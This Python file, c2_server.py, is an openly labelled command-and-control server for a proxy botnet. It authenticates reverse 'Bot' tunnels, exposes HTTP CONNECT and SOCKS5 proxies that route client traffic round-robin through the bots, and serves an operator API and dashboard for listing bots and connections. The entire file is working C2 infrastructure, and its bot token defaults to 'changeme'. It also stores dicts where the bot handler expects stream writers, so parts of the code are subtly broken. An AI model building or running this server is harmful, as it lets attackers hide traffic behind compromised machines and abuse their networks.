#!/usr/bin/env python3
"""
c2_server.py

Async C2 server:
- Accept reverse Bot tunnels over TLS/TCP
- Accept local clients on HTTP proxy (8080) and SOCKS5 (1080)
- Multiplex traffic using framed protocol
- Round-robin load balancing across Bots
"""

import asyncio
import ssl
import logging
import uuid
import os
import json
from typing import Dict, Tuple, Optional

from protocol import Frame, FramedStream, Heartbeat


logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(levelname)s %(name)s: %(message)s")
logger = logging.getLogger("c2")


class BotSession:
    def __init__(self, bot_id: str, stream: FramedStream):
        self.bot_id = bot_id
        self.stream = stream
        self.heartbeat = Heartbeat(stream, name=f"bot-{bot_id}")
        # Map request_id -> (reader, writer) for client connections routed via this bot
        self.active: Dict[str, asyncio.StreamWriter] = {}

    async def start(self):
        await self.heartbeat.start()


class C2Server:
    def __init__(self, host: str = "0.0.0.0", bot_port: int = 4443, http_port: int = 8080, socks_port: int = 1080,
                 certfile: Optional[str] = None, keyfile: Optional[str] = None, bot_token: Optional[str] = None,
                 api_port: int = 5001):
        self.host = host
        self.bot_port = bot_port
        self.http_port = http_port
        self.socks_port = socks_port
        self.api_port = api_port
        self.bot_token = bot_token or "changeme"
        self.ssl_ctx: Optional[ssl.SSLContext] = None
        if certfile and keyfile:
            try:
                if os.path.exists(certfile) and os.path.exists(keyfile):
                    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                    ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
                    self.ssl_ctx = ctx
                    logger.info("TLS enabled with cert: %s, key: %s", certfile, keyfile)
                else:
                    logger.warning("TLS files not found, running without TLS (cert: %s, key: %s)", certfile, keyfile)
            except Exception as e:
                logger.warning("Failed to initialize TLS, running without TLS: %s", e)

        self.bots: Dict[str, BotSession] = {}
        self._rr_keys = []
        self._rr_idx = 0
        self.preferred_bot: Optional[str] = None

    def _next_bot(self) -> Optional[BotSession]:
        if not self.bots:
            return None
        if self.preferred_bot and self.preferred_bot in self.bots:
            return self.bots[self.preferred_bot]
        if not self._rr_keys:
            self._rr_keys = list(self.bots.keys())
            self._rr_idx = 0
        bot_id = self._rr_keys[self._rr_idx % len(self._rr_keys)]
        self._rr_idx += 1
        return self.bots.get(bot_id)

    async def serve(self):
        bot_server = await asyncio.start_server(self._handle_bot, self.host, self.bot_port, ssl=self.ssl_ctx)
        http_server = await asyncio.start_server(self._handle_http_client, self.host, self.http_port)
        socks_server = await asyncio.start_server(self._handle_socks_client, self.host, self.socks_port)
        api_server = await asyncio.start_server(self._handle_api_client, self.host, self.api_port)
        addrs = ", ".join(str(s.getsockname()) for s in bot_server.sockets)
        logger.info("C2 listening for bots on %s", addrs)
        logger.info("HTTP proxy on %s:%d", self.host, self.http_port)
        logger.info("SOCKS5 proxy on %s:%d", self.host, self.socks_port)
        logger.info("Web API on %s:%d", self.host, self.api_port)
        async with bot_server, http_server, socks_server, api_server:
            await asyncio.gather(
                bot_server.serve_forever(),
                http_server.serve_forever(),
                socks_server.serve_forever(),
                api_server.serve_forever(),
            )

    async def _handle_bot(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        peer = writer.get_extra_info("peername")
        stream = FramedStream(reader, writer)
        logger.info("Bot connected from %s", peer)
        # Expect AUTH
        auth = await stream.recv(timeout=10)
        if not auth or auth.type != "AUTH" or not auth.meta or auth.meta.get("token") != self.bot_token:
            logger.warning("Bot auth failed from %s", peer)
            await stream.send(Frame(type="ERR", meta={"reason": "auth_failed"}))
            stream.close()
            return
        bot_id = auth.meta.get("bot_id") or str(peer)
        session = BotSession(bot_id, stream)
        self.bots[bot_id] = session
        self._rr_keys = list(self.bots.keys())
        await session.start()
        await stream.send(Frame(type="OK", meta={"msg": "AUTH_OK"}))
        try:
            while True:
                frame = await stream.recv()
                if frame is None:
                    break
                # Heartbeat
                if await session.heartbeat.handle_rx(frame):
                    continue
                if frame.type == "PROXY_RESPONSE" or frame.type == "DATA":
                    req_id = frame.request_id
                    if not req_id:
                        continue
                    writer = session.active.get(req_id)
                    if writer and frame.payload:
                        try:
                            writer.write(frame.payload)
                            await writer.drain()
                        except Exception as e:
                            logger.warning("client write error: %s", e)
                elif frame.type == "END":
                    req_id = frame.request_id
                    w = session.active.pop(req_id, None)
                    if w:
                        try:
                            w.close()
                        except Exception:
                            pass
                else:
                    logger.debug("unhandled bot frame: %s", frame.type)
        except Exception as e:
            logger.warning("bot session error: %s", e)
        finally:
            logger.info("Bot disconnected: %s", bot_id)
            self.bots.pop(bot_id, None)
            self._rr_keys = list(self.bots.keys())
            stream.close()

    async def _handle_http_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        peer = writer.get_extra_info("peername")
        bot = self._next_bot()
        if not bot:
            writer.write(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
            await writer.drain()
            writer.close()
            return
        # Peek request
        req = await reader.read(4096)
        if not req:
            writer.close();
            return
        # naive parse
        first = req.split(b"\r\n", 1)[0]
        is_connect = first.startswith(b"CONNECT ")
        req_id = str(uuid.uuid4())
        bot.active[req_id] = writer
        if is_connect:
            # CONNECT host:port HTTP/1.1
            try:
                hostport = first.split()[1].decode()
                host, port = hostport.split(":", 1)
                port = int(port)
            except Exception:
                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n"); await writer.drain(); writer.close(); return
            # Tell client tunnel is established
            writer.write(b"HTTP/1.1 200 Connection Established\r\n\r\n"); await writer.drain()
            # Request bot to open upstream
            await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))
            # Track connection meta
            bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}
        else:
            # HTTP over tunnel
            # Extract Host header
            host, port = None, 80
            for line in req.split(b"\r\n"):
                if line.lower().startswith(b"host:"):
                    hp = line.split(b":", 1)[1].strip().decode()
                    if ":" in hp:
                        host, port = hp.split(":", 1)
                        host, port = host.strip(), int(port)
                    else:
                        host = hp
                    break
            if not host:
                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n"); await writer.drain(); writer.close(); return
            await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))
            await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=req))
            bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}

        # Pipe client->bot
        async def pump_client():
            try:
                while True:
                    chunk = await reader.read(4096)
                    if not chunk:
                        break
                    await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
            finally:
                await bot.stream.send(Frame(type="END", request_id=req_id))

        asyncio.create_task(pump_client(), name=f"pump-client-{req_id}")

    async def _handle_socks_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        # Minimal SOCKS5 CONNECT support
        peer = writer.get_extra_info("peername")
        bot = self._next_bot()
        if not bot:
            writer.close(); return
        data = await reader.readexactly(2)
        nmethods = data[1]
        await reader.readexactly(nmethods)  # methods
        writer.write(b"\x05\x00"); await writer.drain()
        req = await reader.readexactly(4)
        if req[1] != 1:  # not CONNECT
            writer.close(); return
        atyp = req[3]
        if atyp == 1:  # IPv4
            host = ".".join(map(str, (await reader.readexactly(4))))
        elif atyp == 3:  # domain
            ln = (await reader.readexactly(1))[0]
            host = (await reader.readexactly(ln)).decode()
        else:
            writer.close(); return
        port = int.from_bytes(await reader.readexactly(2), "big")
        writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00"); await writer.drain()
        req_id = str(uuid.uuid4())
        bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}
        await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))

        async def pump_client():
            try:
                while True:
                    chunk = await reader.read(4096)
                    if not chunk:
                        break
                    await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
            finally:
                await bot.stream.send(Frame(type="END", request_id=req_id))

        asyncio.create_task(pump_client(), name=f"pump-socks-{req_id}")

    async def _handle_api_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        peer = writer.get_extra_info("peername")
        try:
            data = await reader.read(4096)
            if not data:
                writer.close(); return
            text = data.decode(errors="ignore")
            line = text.split("\r\n", 1)[0]
            parts = line.split()
            if len(parts) < 2:
                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n"); await writer.drain(); writer.close(); return
            method, path = parts[0], parts[1]

            def json_response(obj: dict, status: str = "200 OK"):
                import json
                body = json.dumps(obj, default=str).encode()
                hdr = (
                    f"HTTP/1.1 {status}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Access-Control-Allow-Origin: *\r\n\r\n"
                ).encode()
                writer.write(hdr + body)

            if method == "GET" and path == "/api/status":
                total_conns = sum(len(s.active) for s in self.bots.values())
                resp = {
                    "host": self.host,
                    "ports": {"bot": self.bot_port, "http": self.http_port, "socks": self.socks_port, "api": self.api_port},
                    "bots": list(self.bots.keys()),
                    "preferred_bot": self.preferred_bot,
                    "bot_count": len(self.bots),
                    "active_connections": total_conns,
                }
                json_response(resp)
            elif method == "GET" and path == "/api/bots":
                bots = []
                for bid, sess in self.bots.items():
                    bots.append({
                        "bot_id": bid,
                        "active_requests": len(sess.active),
                    })
                json_response({"bots": bots})
            elif method == "GET" and path == "/api/connections":
                conns = []
                for bid, sess in self.bots.items():
                    for rid, info in sess.active.items():
                        conns.append({
                            "request_id": rid,
                            "bot_id": bid,
                            "target": f"{info.get('host')}:{info.get('port')}",
                            "client": info.get('client'),
                        })
                json_response({"connections": conns})
            elif method == "POST" and path == "/api/select_bot":
                # very simple body parse
                body = text.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in text else ""
                import json
                try:
                    payload = json.loads(body or "{}")
                    bid = payload.get("bot_id")
                except Exception:
                    bid = None
                if bid and bid in self.bots:
                    self.preferred_bot = bid
                    json_response({"ok": True, "preferred_bot": bid})
                else:
                    json_response({"ok": False, "error": "invalid_bot"}, status="400 Bad Request")
            elif method == "POST" and path == "/api/clear_preferred_bot":
                self.preferred_bot = None
                json_response({"ok": True})
            else:
                # Serve dashboard and static assets
                import os
                root_dir = os.path.dirname(__file__)
                proj_root = root_dir  # repository root is current dir in this version
                templates_dir = os.path.join(proj_root, 'templates')
                static_dir = os.path.join(proj_root, 'static')

                def send_bytes(body: bytes, content_type: str = 'text/plain; charset=utf-8', status: str = '200 OK'):
                    hdr = (
                        f"HTTP/1.1 {status}\r\n"
                        f"Content-Type: {content_type}\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"Access-Control-Allow-Origin: *\r\n\r\n"
                    ).encode()
                    writer.write(hdr + body)

                if path in ('/', '/dashboard', '/index.html'):
                    html_path = os.path.join(templates_dir, 'dashboard.html')
                    try:
                        with open(html_path, 'rb') as f:
                            body = f.read()
                        send_bytes(body, 'text/html; charset=utf-8')
                    except Exception:
                        writer.write(b"HTTP/1.1 404 Not Found\r\n\r\n")
                elif path.startswith('/static/'):
                    rel = path[len('/static/'):]
                    safe = os.path.normpath(rel).lstrip(os.sep)
                    file_path = os.path.join(static_dir, safe)
                    ctype = 'text/plain; charset=utf-8'
                    if file_path.endswith('.js'):
                        ctype = 'application/javascript; charset=utf-8'
                    elif file_path.endswith('.css'):
                        ctype = 'text/css; charset=utf-8'
                    try:
                        with open(file_path, 'rb') as f:
                            body = f.read()
                        send_bytes(body, ctype)
                    except Exception:
                        writer.write(b"HTTP/1.1 404 Not Found\r\n\r\n")
                else:
                    writer.write(b"HTTP/1.1 404 Not Found\r\n\r\n")
        except Exception as e:
            try:
                writer.write(b"HTTP/1.1 500 Internal Server Error\r\n\r\n")
            except Exception:
                pass
            logger.warning("api error: %s", e)
        finally:
            try:
                await writer.drain()
            except Exception:
                pass
            try:
                writer.close()
            except Exception:
                pass


async def main():
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--config", default="config/config.json", help="Path to config JSON")
    p.add_argument("--host", default="0.0.0.0")
    p.add_argument("--bot-port", type=int, default=4443)
    p.add_argument("--http-port", type=int, default=8080)
    p.add_argument("--socks-port", type=int, default=1080)
    p.add_argument("--certfile")
    p.add_argument("--keyfile")
    p.add_argument("--bot-token", default="changeme")
    args = p.parse_args()

    # Load config file if exists
    cfg = {}
    cfg_path = args.config
    if cfg_path and os.path.exists(cfg_path):
        try:
            with open(cfg_path, "r", encoding="utf-8") as f:
                cfg = json.load(f)
        except Exception as e:
            logger.warning("Failed to load config %s: %s", cfg_path, e)

    # Derive values: CLI overrides config
    host = args.host if args.host != p.get_default("host") or not cfg.get("host") else cfg.get("host")
    host = args.host if args.host != p.get_default("host") else cfg.get("host", args.host)
    bot_port = args.bot_port if args.bot_port != p.get_default("bot_port") else cfg.get("bot_port", args.bot_port)
    http_port = args.http_port if args.http_port != p.get_default("http_port") else cfg.get("http_port", args.http_port)
    socks_port = args.socks_port if args.socks_port != p.get_default("socks_port") else cfg.get("socks_port", args.socks_port)
    api_port = cfg.get("api_port", 5001)  # API port only from config in this version

    # Security
    bot_token = args.bot_token if args.bot_token != p.get_default("bot_token") else cfg.get("bot_token", args.bot_token)
    tls_cfg = cfg.get("tls", {})
    tls_enabled_cfg = bool(tls_cfg.get("enabled"))
    # Only take cert/key from config when tls.enabled is true; CLI overrides always respected
    certfile = args.certfile if args.certfile else (tls_cfg.get("certfile") if tls_enabled_cfg else None)
    keyfile = args.keyfile if args.keyfile else (tls_cfg.get("keyfile") if tls_enabled_cfg else None)

    server = C2Server(host, bot_port, http_port, socks_port, certfile, keyfile, bot_token, api_port)
    await server.serve()


if __name__ == "__main__":
    asyncio.run(main())


